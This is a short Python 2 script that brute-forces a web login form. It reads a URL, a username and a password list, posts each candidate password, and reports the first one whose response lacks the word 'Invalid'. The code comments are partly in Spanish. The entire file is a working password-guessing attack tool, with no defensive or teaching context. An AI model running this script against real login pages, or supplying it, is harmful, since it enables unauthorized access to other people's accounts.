#!/usr/bin/env python

import sys
import requests

if len(sys.argv) < 4:
    print "usage: <url> <username> <path a passlist> "
    sys.exit()

url = sys.argv[1]
username = sys.argv[2]
pathpass = sys.argv[3]
passlist = open(pathpass, 'r').readlines()
#for to iterate trough the list
for line in passlist:
    password = line.strip()
    # aca hay que cambiarlo siempre de acuerdo a como va el source code
    http = requests.post(url, data={'name':username, 'password':password,'submit':'Submit' } ) #'submit':'Submit' can change according to web form
    content = http.content

    #Invalid or error message request to compare    
    if "Invalid" in content:
        print "no no no : ", password
       
    else:
        print "password encontrado = ", password
        sys.exit()
    
       



